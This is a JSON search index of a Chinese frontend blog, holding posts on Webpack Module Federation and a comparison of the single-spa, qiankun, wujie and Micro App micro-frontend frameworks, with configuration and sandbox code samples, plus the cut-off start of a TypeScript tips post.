[{"content":" 一、模块联邦 模块联邦 (Module Federation) 是 Webpack 5 中的一个新特性，它允许将多个 Webpack 应用程序打包成一个整体，并在运行时动态加载和卸载模块 。这使得开发人员可以将大型应用程序分解成更小的模块，并独立开发和部署这些模块。\n模块联邦的主要功能包括:\n代码共享: 允许多个应用程序共享代码和资源，从而减少代码冗余并提高开发效率。 动态加载: 允许在运行时动态加载和卸载模块，从而提高应用程序的灵活性和性能。 远程依赖: 允许应用程序加载来自远程服务器的模块，从而实现模块的按需加载。 模块联邦的应用场景:\n微前端: 可以使用模块联邦将大型前端应用程序分解成更小的微前端应用程序，并独立开发和部署这些微前端应用程序。 共享组件库: 可以将共享组件库构建成一个模块联邦应用程序，并将其部署到远程服务器，然后其他应用程序可以动态加载该组件库。 多模块应用程序: 可以使用模块联邦将多模块应用程序打包成一个整体，并在运行时动态加载和卸载模块，从而提高应用程序的灵活性和性能。 1.1 模块联邦的示例 以下是一个简单的模块联邦示例，其中包含两个应用程序:\n主应用程序: 主应用程序负责加载和卸载子应用程序。 子应用程序: 子应用程序是一个独立的 Webpack 应用程序，可以被主应用程序动态加载。 // 主应用程序 import { ModuleFederationPlugin } from \u0026#39;webpack\u0026#39;; const config = { entry: \u0026#39;./main.js\u0026#39;, output: { filename: \u0026#39;main.js\u0026#39;, }, plugins: [ new ModuleFederationPlugin({ remotes: { \u0026#39;./sub-app\u0026#39;: \u0026#39;http://localhost:3000/sub-app.js\u0026#39;, }, }), ], }; export default config; // 子应用程序 import { ModuleFederationPlugin } from \u0026#39;webpack\u0026#39;; const config = { entry: \u0026#39;./sub-app.js\u0026#39;, output: { filename: \u0026#39;sub-app.js\u0026#39;, }, plugins: [ new ModuleFederationPlugin({ name: \u0026#39;sub-app\u0026#39;, library: { type: \u0026#39;var\u0026#39;, name: \u0026#39;subApp\u0026#39; }, exposes: { \u0026#39;./component\u0026#39;: \u0026#39;./component.js\u0026#39;, }, }), ], }; export default config; 在该示例中，主应用程序可以通过以下方式加载子应用程序:\nconst subApp = await import(\u0026#39;http://localhost:3000/sub-app.js\u0026#39;); // 使用子应用程序中的组件 const component = subApp.component; 二、vite 相关 支持模块联邦Module Federation的Vite/Rollup插件，可与Webpack Module Federation兼容: vite-plugin-federation 更多内容，待补充\u0026hellip;\n参考 Webpack 官方文档 - 模块联邦: https://webpack.docschina.org/concepts/module-federation/ 模块联邦示例: https://github.com/kavience/module-federation-demo 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/buildtool-modulefederation/","summary":"一、模块联邦 模块联邦 (Module Federation) 是 Webpack 5 中的一个新特性，它允许将多个 Webpack","title":"工程化: 模块联邦Module Federation机制"},{"content":"系列文章：\n第一篇：微前端: qiankun、wujie和Micro App等框架对比 微前端架构主要解决单体应用（常见于企业级 Web 应用）在一个相对长的时间跨度下，由于参与的人员、团队的增多、变迁，从一个普通应用演变成一个 巨石应用(Frontend Monolith) 后，应用不可维护的问题。\n在各大微前端解决方案出现前，通常用iframe解决这类问题。本文首先从iframe和微前端架构的视角，去对比下原理。其次，对比现有的各大微前端框架\n一、iframe vs 微前端架构 1.iframe iframe提供了浏览器原生的硬隔离方案 ，不论是【巨石应用】的样式隔离、js隔离问题都能被完美解决。 但最大问题也在于iframe的隔离性无法被突破，导致应用间上下文无法被共享，带来开发和产品体验的问题：\nurl不同步: 浏览器刷新iframe url状态丢失、后退前进按钮无法使用 UI不同步: DOM结构不共享，弹窗只能在iframe内部展示，无法覆盖全局 隔离问题: 全局上下文完全隔离，内存变量不共享，iframe内外系统的通信、数据同步等需求，主应用的cookie要透传到根域名都不同的子应用中实现免登效果 慢: 每次子应用进入都是一次浏览器上下文重建、资源重新加载的过程 2.微前端架构 微前端框架内的各个应用都支持独立开发部署、不限技术框架、支持独立运行、应用状态隔离但也可共享等特征。\n二、微前端架构 框架1: single-spa single-spa是最早的微前端框架，兼容多种前端技术栈，支持将多个单页面应用聚合为一个整体应用的。\n简单来说就是【聚合】，该库可让你的应用使用多个不同的技术栈（vue、react、angular等)进行同步开发，最后使用一个公用的路由去实现完美的切换\n1.实现方案 single-spa实现了一套 【生命周期】，开发者需在相应的时机自己去加载对应的子应用。它做的事情就是：注册子应用、监听URL变化，然后加载对应的子应用js，执行对应子应用的生命周期流程。\n提供registerApplication方法，用来注册子应用列表 提供activeWhen，由开发者指定路由满足条件时，激活（挂载）子应用的js、css。 js隔离由single-spa-leaked-globals实现 本质上就是在 mount A 子应用时，正常添加全局变量，比如 jQuery 的 $, lodash 的 _。在 unmount A 子应用时，用一个对象记录之前给 window 添加的全局变量，并把 A 应用里添加 window 的变量都删掉。下一次再 mount A 应用时，把记录的全局变量重新加回来。 css隔离： 子应用之间通过single-spa-css插件提供的css生命周期函数，做到子应用mount时加载css，子应用unmount时将css unmount掉 主应用与子应用之间可通过PostCSSPrefix Selector给样式自动加前缀的方式，或Shadow DOM的形式去解决。 2.single-spa实战 i.主应用入口文件 主要通过single-spa提供的registerApplication方法注册子应用，子应用需要指定加载子应用的方法、和路由条件\nimport Vue from \u0026#39;vue\u0026#39; import App from \u0026#39;./App.vue\u0026#39; import router from \u0026#39;./router\u0026#39; import { registerApplication, start } from \u0026#39;single-spa\u0026#39; Vue.config.productionTip = false // 远程加载子应用 function createScript(url) { return new Promise((resolve, reject) =\u0026gt; { const script = document.createElement(\u0026#39;script\u0026#39;) script.src = url script.onload = resolve script.onerror = reject const firstScript = document.getElementsByTagName(\u0026#39;script\u0026#39;)[0] firstScript.parentNode.insertBefore(script, firstScript) }) } // 加载函数，返回一个 promise function loadApp(url, globalVar) { // 支持远程加载子应用 return async () =\u0026gt; { await createScript(url + \u0026#39;/js/chunk-vendors.js\u0026#39;) await createScript(url + \u0026#39;/js/app.js\u0026#39;) // 这里的return很重要，需要从这个全局对象中拿到子应用暴露出来的生命周期函数 return window[globalVar] } } // 子应用列表 const apps = [ { // 子应用名称 name: \u0026#39;app1\u0026#39;, // 子应用加载函数，是一个promise app: loadApp(\u0026#39;http://localhost:8081\u0026#39;, \u0026#39;app1\u0026#39;), // 当路由满足条件时（返回true），激活（挂载）子应用 activeWhen: location =\u0026gt; location.pathname.startsWith(\u0026#39;/app1\u0026#39;), // 传递给子应用的对象 customProps: {} }, { name: \u0026#39;app2\u0026#39;, app: loadApp(\u0026#39;http://localhost:8082\u0026#39;, \u0026#39;app2\u0026#39;), activeWhen: location =\u0026gt; location.pathname.startsWith(\u0026#39;/app2\u0026#39;), customProps: {} }, { // 子应用名称 name: \u0026#39;app3\u0026#39;, // 子应用加载函数，是一个promise app: loadApp(\u0026#39;http://localhost:3000\u0026#39;, \u0026#39;app3\u0026#39;), // 当路由满足条件时（返回true），激活（挂载）子应用 activeWhen: location =\u0026gt; location.pathname.startsWith(\u0026#39;/app3\u0026#39;), // 传递给子应用的对象，这个很重要，该配置告诉react子应用自己的容器元素是什么，这块儿和vue子应用的集成不一样，官网并没有说这部分，或者我没找到，是通过看single-spa-react源码知道的 customProps: { domElement: document.getElementById(\u0026#39;microApp\u0026#39;), // 添加 name 属性是为了兼容自己写的lyn-single-spa，原生的不需要，当然加了也不影响 name: \u0026#39;app3\u0026#39; } } ] // 注册子应用 for (let i = apps.length - 1; i \u0026gt;= 0; i--) { registerApplication(apps[i]) } new Vue({ router, mounted() { // 启动 start() }, render: h =\u0026gt; h(App) }).$mount(\u0026#39;#app\u0026#39;) ii.子应用导出文件 子应用需要安装single-spa-react或者single-spa-vue， 将子应用传递给single-spa-react，得到子应用运行的生命周期， 子应用将生命周期导出到全局， 在主应用可以获取子应用的生命周期函数 import React from \u0026#39;react\u0026#39;; import ReactDOM from \u0026#39;react-dom\u0026#39;; import \u0026#39;./index.css\u0026#39; import { BrowserRouter, Link, Route } from \u0026#39;react-router-dom\u0026#39; import singleSpaReact from \u0026#39;single-spa-react\u0026#39; // 子应用独立运行 if (!window.singleSpaNavigate) { ReactDOM.render(rootComponent(), document.getElementById(\u0026#39;root\u0026#39;)) } // 生命周期a const reactLifecycles = singleSpaReact({ React, ReactDOM, rootComponent, errorBoundary(err, info, props) { return \u0026lt;div\u0026gt; This renders when a catastrophic error occurs \u0026lt;/div\u0026gt; } }) // 这里和vue不一样，props必须向下传递 export const bootstrap = async props =\u0026gt; { console.log(\u0026#39;app3 bootstrap\u0026#39;); return reactLifecycles.bootstrap(props) } export const mount = async props =\u0026gt; { console.log(\u0026#39;app3 mount\u0026#39;); return reactLifecycles.mount(props); } export const unmount = async props =\u0026gt; { console.log(\u0026#39;app3 unmount\u0026#39;); return reactLifecycles.unmount(props) } // 根组件 function rootComponent() { return \u0026lt;React.StrictMode\u0026gt; \u0026lt;BrowserRouter\u0026gt; \u0026lt;div\u0026gt; \u0026lt;Link to=\u0026#34;/app3\u0026#34;\u0026gt;Home\u0026lt;/Link\u0026gt; | \u0026lt;Link to=\u0026#34;/app3/about\u0026#34;\u0026gt; About\u0026lt;/Link\u0026gt; \u0026lt;Route exact path=\u0026#34;/app3\u0026#34; component={Home} /\u0026gt; \u0026lt;Route exact path=\u0026#34;/app3/about\u0026#34; component={About} /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/BrowserRouter\u0026gt; \u0026lt;/React.StrictMode\u0026gt; } // home 组件 function Home() { return \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;app3 home page\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; } // about 组件 function About() { return \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;app3 about page\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; } iii.打包配置 将子应用导出模式设置为umd\nconst package = require(\u0026#39;./package.json\u0026#39;) module.exports = { // 告诉子应用在这个地址加载静态资源，否则会去基座应用的域名下加载 publicPath: \u0026#39;//localhost:8082\u0026#39;, // 开发服务器 devServer: { port: 8082 }, configureWebpack: { // 导出umd格式的包，在全局对象上挂载属性package.name，基座应用需要通过这个全局对象获取一些信息，比如子应用导出的生命周期函数 output: { // library的值在所有子应用中需要唯一 library: package.name, libraryTarget: \u0026#39;umd\u0026#39; } } } iv.预览 可以看到它是动态加载的子应用的js，并执行js，将内容渲染到了主应用的盒子内。\n3.框架优缺点 优点：\n敏捷性 - 独立开发、独立部署，微应用仓库独立，前后端可独立开发，部署完成后主框架自动完成同步更新； 技术栈无关，主框架不限制接入应用的技术栈，微应用具备完全自主权； 增量升级，在面对各种复杂场景时，我们通常很难对一个已经存在的系统做全量的技术栈升级或重构，而微前端是一种非常好的实施渐进式重构的手段和策略 缺点：\n需要自己去加载子应用 不支持Javascript沙箱隔离，需要自己去使用single-spa-leaked-globals之类的库去隔离 不支持css隔离，需要自己使用single-spa-css库或者postcss等去解决样式冲突问题 无法预加载 框架2: qiankun 阿里的qiankun是基于single-spa的微前端实现库，孵化自蚂蚁，能更简单、无痛的构建一个生产可用微前端架构系统。目前(2024年4月) github star 15.4k。\n1.实现方案 single-spa是基于js-entry方案，而qiankun 是基于html-entry 及沙箱设计，使得微应用的接入 像使用 iframe 一样简单。 主应用监听路由，加载对应子应用的html，挂载到主应用的元素内，然后解析子应用的html，从中分析出css、js再去沙盒化后加载执行，最终将子应用的内容渲染出来。 qiankun实现样式隔离有两种模式可供开发者选择： strictStyleIsolation： 这种模式下 qiankun 会为每个微应用的容器包裹上一个 shadow dom 节点，从而确保微应用的样式不会对全局造成影响。 experimentalStyleIsolation： 当 experimentalStyleIsolation 被设置为 true 时，qiankun 会改写子应用所添加的样式，会为所有样式规则增加一个特殊的选择器规则，来限定其影响范围 qiankun实现js隔离，采用了两种沙箱，分别为基于Proxy实现的沙箱和快照沙箱，当浏览器不支持Proxy会降级为快照沙箱 Proxy沙箱机制：\n// 伪代码 class ProxySandbox { constructor() { const rawWindow = window; const fakeWindow = {} const proxy = new Proxy(fakeWindow, { set(target, p, value) { target[p] = value; return true }, get(target, p) { return target[p] || rawWindow[p]; } }); this.proxy = proxy } } let sandbox1 = new ProxySandbox(); let sandbox2 = new ProxySandbox(); window.a = 1; // 伪代码 ((window) =\u0026gt; { window.a = \u0026#39;hello\u0026#39;; console.log(window.a) // hello })(sandbox1.proxy); ((window) =\u0026gt; { window.a = \u0026#39;world\u0026#39;; console.log(window.a) // world })(sandbox2.proxy); 快照沙箱：\n// 伪代码 class SnapshotSandbox { constructor() { this.proxy = window; this.modifyPropsMap = {}; // 修改了那些属性 this.active(); // 调用active保存主应用window快照 } /**1. 初始化时，在子应用即将mount前，先调用active，保存当前主应用的window快照*/ active() { this.windowSnapshot = {}; // window对象的快照 for (const prop in window) { if (window.hasOwnProperty(prop)) { // 将window上的属性进行拍照 this.windowSnapshot[prop] = window[prop]; } } Object.keys(this.modifyPropsMap).forEach(p =\u0026gt; { window[p] = this.modifyPropsMap[p]; }); } /** * 子应用卸载时，遍历当前子应用的window属性，和主应用的window快照做对比 * 如果不一致，做两步操作 * 1. 保存 不一致的window属性， * 2. 还原window */ inactive() { for (const prop in window) { // diff 差异 if (window.hasOwnProperty(prop)) { // 将上次拍照的结果和本次window属性做对比 if (window[prop] !== this.windowSnapshot[prop]) { // 保存修改后的结果 this.modifyPropsMap[prop] = window[prop]; // 还原window window[prop] = this.windowSnapshot[prop]; } } } } } 2.qiankun实战 i.主应用入口文件 初始化主应用，并注册子应用 主应用入口文件初始化应用，注册子应用，注册子应用时支持传入子应用列表， 注册子应用时需要指明以下几个主要参数：\nname： 微应用的名称，微应用之间必须确保唯一 entry： 子应用的访问链接。主应用会加载整个页面，例如https://qiankun.umijs.org/guide/ container：需要挂载子应用的DOM元素 loader: 子应用未加载时的界面，一般为loading activeRule： 路由匹配规则 开启子应用start(options) options.prefetch此时可以选择是否预加载子应用。 options.sandbox默认情况下的沙箱可确保【单实例场景子应用之间】的样式隔离，但无法确保主应用和子应用、或者多实例场景的子应用样式隔离。qiankun提供了另外两种方式的隔离，供开发者选择： strictStyleIsolation：当配置为{ strictStyleIsolation: true }时表示开启严格的样式隔离模式。这种模式下qiankun会为每个微应用的容器包裹上一个shadow dom节点，从而确保微应用的样式不会对全局造成影响 experimentalStyleIsolation：当{experimentalStyleIsolation: true}被设置，qiankun会改写子应用所添加的样式为所有样式规则增加一个特殊的选择器规则来限定其影响范围 import { registerMicroApps, start, initGlobalState } from \u0026#39;qiankun\u0026#39;; registerMicroApps([ { name: \u0026#39;react app\u0026#39;, // app name registered entry: \u0026#39;//localhost:7100\u0026#39;, container: \u0026#39;#yourContainer\u0026#39;, activeRule: \u0026#39;/yourActiveRule\u0026#39;, }, { name: \u0026#39;vue app\u0026#39;, entry: { scripts: [\u0026#39;//localhost:7100/main.js\u0026#39;] }, container: \u0026#39;#yourContainer2\u0026#39;, activeRule: \u0026#39;/yourActiveRule2\u0026#39;, }, ]); // 通讯 const { onGlobalStateChange, setGlobalState } = initGlobalState({ user: \u0026#39;qiankun\u0026#39;, }); onGlobalStateChange((value, prev) =\u0026gt; console.log(\u0026#39;[onGlobalStateChange - master]:\u0026#39;, value, prev)); setGlobalState({ ignore: \u0026#39;master\u0026#39;, user: { name: \u0026#39;master\u0026#39;, }, }); /** * 设置默认进入的子应用 */ setDefaultMountApp(\u0026#39;/react16\u0026#39;); /** * 启动应用 */ start({ prefetch: true, // 预加载子应用 sandbox:{ strictStyleIsolation: true, // shadow dom的方式实现样式隔离 // experimentalStyleIsolation: true, //添加特殊的选择器的方式实现样式隔离 } }); runAfterFirstMounted(() =\u0026gt; { console.log(\u0026#39;[MainApp] first app mounted\u0026#39;); }); ii.子应用导出生命周期钩子 子应用需在自己的入口 js导出bootstrap、mount、unmount三个生命周期钩子，以供主应用在适当的时机调用\nimport React from \u0026#39;react\u0026#39;; import ReactDOM from \u0026#39;react-dom\u0026#39;; import App from \u0026#39;./App\u0026#39;; import * as serviceWorker from \u0026#39;./serviceWorker\u0026#39;; function render(props) { const { container } = props; ReactDOM.render(\u0026lt;App /\u0026gt;, container ? container.querySelector(\u0026#39;#root\u0026#39;) : document.querySelector(\u0026#39;#root\u0026#39;)); } /** * 和主应用通讯 */ function storeTest(props) { props.onGlobalStateChange((value, prev) =\u0026gt; console.log(`[onGlobalStateChange - ${props.name}]:`, value, prev), true); props.setGlobalState({ ignore: props.name, user: { name: props.name, }, }); } if (!window.__POWERED_BY_QIANKUN__) { render({}); } /** * bootstrap 只会在微应用初始化的时候调用一次，下次微应用重新进入时会直接调用 mount 钩子，不会再重复触发 bootstrap。 * 通常我们可以在这里做一些全局变量的初始化，比如不会在 unmount 阶段被销毁的应用级别的缓存等。 */ export async function bootstrap() { console.log(\u0026#39;[react16] react app bootstraped\u0026#39;); } /** * 应用每次进入都会调用 mount 方法，通常我们在这里触发应用的渲染方法 */ export async function mount(props) { console.log(\u0026#39;[react16] props from main framework\u0026#39;, props); storeTest(props); render(props); } /** * 应用每次 切出/卸载 会调用的方法，通常在这里我们会卸载微应用的应用实例 */ export async function unmount(props) { const { container } = props; ReactDOM.unmountComponentAtNode(container ? container.querySelector(\u0026#39;#root\u0026#39;) : document.querySelector(\u0026#39;#root\u0026#39;)); } iii. 配置打包工具 为了让主应用能正确识别微应用暴露出来的一些全局信息和开发环境下的跨域兼容，在子应用（以create-react-app出来的react项目为例）安装@rescripts/cli，并在子应用目录下新建.rescriptsrc.js，内容如下：\nconst { name } = require(\u0026#39;./package\u0026#39;); module.exports = { webpack: (config) =\u0026gt; { config.output.library = `${name}-[name]`; config.output.libraryTarget = \u0026#39;umd\u0026#39;; // 为了能通过window[\u0026#39;app-name1\u0026#39;]拿到子应用声明的生命周期 // webpack 5 需要把 jsonpFunction 替换成 chunkLoadingGlobal config.output.jsonpFunction = `webpackJsonp_${name}`; config.output.globalObject = \u0026#39;window\u0026#39;; return config; }, devServer: (_) =\u0026gt; { const config = _; config.headers = { \u0026#39;Access-Control-Allow-Origin\u0026#39;: \u0026#39;*\u0026#39;, }; config.historyApiFallback = true; config.hot = false; config.watchContentBase = false; config.liveReload = false; return config; }, }; iv.预览 使用strictStyleIsolation：true方式进行样式隔离，会生成一个shadow dom，进行样式的完全隔离：\n使用experimentalStyleIsolation：true的方式进行样式隔离，会在css选择器前添加特殊标识： 可以看到，qiankun会将子应用的html渲染到自定义的container中。 主应用加载的是子应用的html，在解析子应用的html的过程中遇到js和css会载框架内进行沙盒处理，完成css和js的隔离，之后下载并执行，完成整个子应用的渲染过程。\n3.框架优缺点 优点\nhtml entry的接入方式，不需要自己写load方法，而是直接写子应用的访问链接就可以。 提供js沙箱 提供样式隔离，两种方式可选 资源预加载，在浏览器空闲时间预加载未打开的微应用资源，加速微应用打开速度。 社区活跃 umi 插件，提供了 @umijs/plugin-qiankun 供 umi 应用一键切换成微前端架构系统 除了最后一点拓展以外，微前端想要达到的效果都已经达到。 应用间通信简单，全局注入路由保持，浏览器刷新、前进、后退，都可以作用到子应用 路由保持，浏览器刷新、前进、后退，都可以作用到子应用 缺点\n改造成本较大，从 webpack、代码、路由等等都要做一系列的适配 对 eval 的争议，eval函数的安全和性能是有一些争议的：MDN的eval介绍； 无法同时激活多个子应用，也不支持子应用保活 无法支持 vite 等 ESM 脚本运行 框架3: wujie wujie是腾讯出品。基于 webcomponent 容器 + iframe 沙箱，能够完善的解决适配成本、样式隔离、运行性能、页面白屏、子应用通信、子应用保活、多应用激活、vite 框架支持、应用共享等。目前（2024年4月）github star 3.7k\n1.实现方案 无界利用iframe和webcomponent来搭建天然的js隔离沙箱和css隔离沙箱, 利用iframe的history和主应用的history在同一个top-level browsing context来搭建天然的路由同步机制 支持以fiber的形式执行js，由于子应用的执行会阻塞主应用的渲染线程，当fiber设置为true，那么js执行时采取类似react fiber的模式方式间断执行，每个 js 文件的执行都包裹在requestidlecallback中，每执行一个js可以返回响应外部的输入，但是这个颗粒度是js文件，如果子应用单个js文件过大，可以通过拆包的方式降低达到fiber模式效益最大化 wujie是如何渲染子应用的？ wujie跟qiankun一样，都是基于html entry加载的，但他们解析html的过程是不一样的。 qiankun是直接解析并执行js、css、html的，而wujie则是先解析html，提取出script脚本放入空的iframe中，提取出css、html放入到web components中，具体来说：\n解析入口 HTML ，分别得到script、css、模版html 创建一个纯净的 iframe，为了实现应用间（iframe 间）通讯，无界子应用 iframe 的 url 会设置为主应用的域名（同域），因此 iframe 的 location.href 并不是子应用的 url。创建好后停止加载iframe。 iframe内插入js，将抽离出来的script脚本，插到iframe中去，在iframe中执行子应用的js 创建web component，id为子应用id，将抽离出来的html插入。 由于iframe内的js有可能操作dom，但是iframe内没有dom，随意wujie框架内对iframe拦截document对象，统一将dom指向shadowRoot，此时比如新建元素、弹窗或者冒泡组件就可以正常约束在shadowRoot内部。 2.wujie实战 wujie接入很简单，主应用可以让开发者以组件的方式加载子应用。子应用只需要做支持跨域请求改造，这个是所有微前端框架运行的前提，除此之外子应用可以不做任何改造就可以在无界框架中运行，不过此时运行的方式是重建模式。 子应用也可以配置保活、生命周期适配进入保活模式或单例模式。\ni.主应用入口文件 与其他框架一样，先配置子应用\n// main-react/index.js import \u0026#34;react-app-polyfill/stable\u0026#34;; import \u0026#34;react-app-polyfill/ie11\u0026#34;; import React from \u0026#34;react\u0026#34;; import ReactDOM from \u0026#34;react-dom\u0026#34;; import WujieReact from \u0026#34;wujie-react\u0026#34;; import \u0026#34;./index.css\u0026#34;; import App from \u0026#34;./App\u0026#34;; import hostMap from \u0026#34;./hostMap\u0026#34;; import credentialsFetch from \u0026#34;./fetch\u0026#34;; import lifecycles from \u0026#34;./lifecycle\u0026#34;; import plugins from \u0026#34;./plugin\u0026#34;; const { setupApp, preloadApp, bus } = WujieReact; const isProduction = process.env.NODE_ENV === \u0026#34;production\u0026#34;; bus.$on(\u0026#34;click\u0026#34;, (msg) =\u0026gt; window.alert(msg)); const degrade = window.localStorage.getItem(\u0026#34;degrade\u0026#34;) === \u0026#34;true\u0026#34; || !window.Proxy || !window.CustomElementRegistry; /** * 大部分业务无需设置 attrs * 此处修正 iframe 的 src，是防止github pages csp报错 * 因为默认是只有 host+port，没有携带路径 */ const attrs = isProduction ? { src: hostMap(\u0026#34;//localhost:7700/\u0026#34;) } : {}; /** * 配置应用，主要是设置默认配置 * preloadApp、startApp的配置会基于这个配置做覆盖 */ setupApp({ name: \u0026#34;react16\u0026#34;, url: hostMap(\u0026#34;//localhost:7600/\u0026#34;), attrs, // 子应用iframe的src exec: true, // 预执行 fetch: credentialsFetch, // 自定义的fetch方法 plugins, /** 子应用短路径替换，路由同步时生效 */ prefix: { \u0026#34;prefix-dialog\u0026#34;: \u0026#34;/dialog\u0026#34;, \u0026#34;prefix-location\u0026#34;: \u0026#34;/location\u0026#34; }, /** 子应用采用降级iframe方案 */ degrade, ...lifecycles, }); setupApp({ name: \u0026#34;vue3\u0026#34;, url: hostMap(\u0026#34;//localhost:7300/\u0026#34;), attrs, exec: true, alive: true, // 子应用保活，state不会丢失 plugins: [{ cssExcludes: [\u0026#34;https://stackpath.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\u0026#34;] }], // 引入了的第三方样式不需要添加credentials fetch: (url, options) =\u0026gt; url.includes(hostMap(\u0026#34;//localhost:7300/\u0026#34;)) ? credentialsFetch(url, options) : window.fetch(url, options), degrade, ...lifecycles, }); if (window.localStorage.getItem(\u0026#34;preload\u0026#34;) !== \u0026#34;false\u0026#34;) { preloadApp({ name: \u0026#34;react16\u0026#34;, }); if (window.Proxy) { preloadApp({ name: \u0026#34;vue3\u0026#34;, }); } } ReactDOM.render(\u0026lt;App /\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;)); 引入子应用的地方直接以组件式的方式引入：\nimport React from \u0026#34;react\u0026#34;; import hostMap from \u0026#34;../hostMap\u0026#34;; import WujieReact from \u0026#34;wujie-react\u0026#34;; import { useNavigate, useLocation } from \u0026#34;react-router-dom\u0026#34;; export default function React16() { const navigation = useNavigate(); const location = useLocation(); const path = location.pathname.replace(\u0026#34;/react16-sub\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;/react16\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;/\u0026#34;,\u0026#34;\u0026#34;); //// const react16Url = hostMap(\u0026#34;//localhost:7600/\u0026#34;) + path; const props = { jump: (name) =\u0026gt; { navigation(`/${name}`); }, }; return ( // 单例模式，name相同则复用一个无界实例，改变url则子应用重新渲染实例到对应路由 \u0026lt;WujieReact width=\u0026#34;100%\u0026#34; height=\u0026#34;100%\u0026#34; name=\u0026#34;react16\u0026#34; url={react16Url} sync={!path} props={props} \u0026gt;\u0026lt;/WujieReact\u0026gt; ); } ii.预览 2.框架优缺点 优点：\n接入简单，可以以组件的方式引入子应用 纯净无污染 无界利用iframe和webcomponent来搭建天然的js隔离沙箱和css隔离沙箱 利用iframe的history和主应用的history在同一个top-level browsing context来搭建天然的路由同步机制 副作用局限在沙箱内部，子应用切换无需任何清理工作，没有额外的切换成本 支持vite esmoudle加载，由于js是独立在iframe中加载的，所以支持esmodule加载 支持预加载 支持应用保活，子应用状态保留，由于是独立在iframe中的，而切换应用时不会移除iframe，所以子应用的状态会被保留在原来的iframe中，当主应用再次渲染子应用dom时，会显示之前的状态。 多应用同时激活在线 缺点：\niframe沙箱的src设置了主应用的host，初始化iframe的时候需要等待iframe的location.orign从\u0026rsquo;about:blank\u0026rsquo;初始化为主应用的host，这个采用的计时器去等待的不是很优雅。 框架4: Micro App mirco-app 是京东2021年开源的一款微前端框架。它借助了浏览器对 webComponent 的支持，实现了一套微前端方案体系。并且由于 Shadow Dom 对 react 这类库的兼容性较差，便自己实现了类 Shadow Dom 的效果。与 qiankun 相比，接入更加简单。最新的版本也支持iframe实现js隔离，类似wujie。截至目前（2024年4月）github star 5.2k\n1.实现方案 首先micro-app实现了一个基于WebComponent的组件，并实现了类Shadow Dom 的效果，开发者只需要用\u0026lt;micro-app name=\u0026quot;xx\u0026quot; url=\u0026quot;xx\u0026quot; baseroute=\u0026quot;/xxx/xxx\u0026quot;\u0026gt;来加载子应用，整个对子应用的加载、js隔离、css隔离的逻辑都封装在了web component组件\u0026lt;micro-app\u0026gt;中，具体来说：\n当调用microApp.start()后，会注册一个名为micro-app 的自定义 webComponent 标签。我们可以从 \u0026lt;micro-app name='app1' url='xx' baseroute='/my-page'\u0026gt;\u0026lt;/micro-app\u0026gt; 中拿到子应用的线上入口地址。 \u0026lt;micro-app\u0026gt;组件内部，当匹配到路由后，跟qiankun一样加载html，得到html字符串模版 分析html字符串，提取\u0026lt;head\u0026gt;头和\u0026lt;body\u0026gt;，并替换为框架自定义标签\u0026lt;micro-app-head\u0026gt;和\u0026lt;micro-app-body\u0026gt; 在\u0026lt;micro-app-head\u0026gt;内，会对script标签和link标签的内容进行加载并执行 将\u0026lt;micro-app-head\u0026gt;和\u0026lt;micro-app-body\u0026gt;插入到\u0026lt;micro-app\u0026gt;标签内 \u0026lt;micro-app\u0026gt;内提供了js沙箱方法（v1.0以前跟qiankun沙箱一样），\u0026lt;micro-app-head\u0026gt;挂载到\u0026lt;micro-app\u0026gt;后，内部会逐一对\u0026lt;micro-app-head\u0026gt;内的script标签的js绑定作用域，实现js隔离。 css隔离方案 默认使用正则将CSS字符串切割成最小单元，每个单元包含一段CSS信息，将所有的信息整理生成CSSTree，遍历CSSTree的每个规则，添加前缀实现样式隔离。\njs隔离方案 micro-app有两种方式实现js隔离，默认是跟qiankun一样采用proxy沙箱的方式隔离， 在v1.0发布后支持了基于原生iframe的隔离方式。\n2.Micro App实战 i.主应用入口文件 import React from \u0026#39;react\u0026#39;; import ReactDOM from \u0026#39;react-dom\u0026#39;; import \u0026#39;./index.css\u0026#39;; import Router from \u0026#39;./router\u0026#39;; import microApp from \u0026#39;@micro-zoe/micro-app\u0026#39; microApp.start() ReactDOM.render( \u0026lt;React.StrictMode\u0026gt; \u0026lt;Router /\u0026gt; \u0026lt;/React.StrictMode\u0026gt;, document.getElementById(\u0026#39;root\u0026#39;) ); 调用子应用\nexport function MyPage () { return ( \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;子应用👇\u0026lt;/h1\u0026gt; // name：应用名称, url：应用地址 \u0026lt;micro-app name=\u0026#39;my-app\u0026#39; url=\u0026#39;http://localhost:3000/\u0026#39;\u0026gt;\u0026lt;/micro-app\u0026gt; \u0026lt;/div\u0026gt; ) } ii.预览 2.框架优缺点 优点\n接入简单，组件式引入子应用 团队持续更新维护 js隔离、css隔离、路由同步 支持子应用保活, 需要开启keep-alive模式 支持fiber模式，提升主应用的渲染性能。 缺点\n1.0之前不支持vite，1.0之后支持了 默认css隔离方式，主应用的样式还是会污染到子应用。 子应用和主应用必须相同的路由模式，要么同时hash模式，要么同时history模式 依赖于CustomElements和Proxy两个较新的API。Proxy暂时没有做兼容，所以对于不支持Proxy的浏览器无法运行micro-app。 参考 探探各个微前端框架 | 奇舞精选 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/microfrontend_framework_compare/","summary":"系列文章： 第一篇：微前端: qiankun、wujie和Mic","title":"微前端: qiankun、wujie和Micro App等框架对比"},{"content":"摘要\u0026hellip;\n一、语法类：代码片段 1.类型 a.指定object类型 private userData : { [key: string]: any } 二、配置类：常见问题 1.报错模块“xxx”没有导出的成员“ZNavigator” 详细报错: 在ts的项目中，通过import { ZNavigator } from '@lianpf/native-sdk-plus'引入，但报错 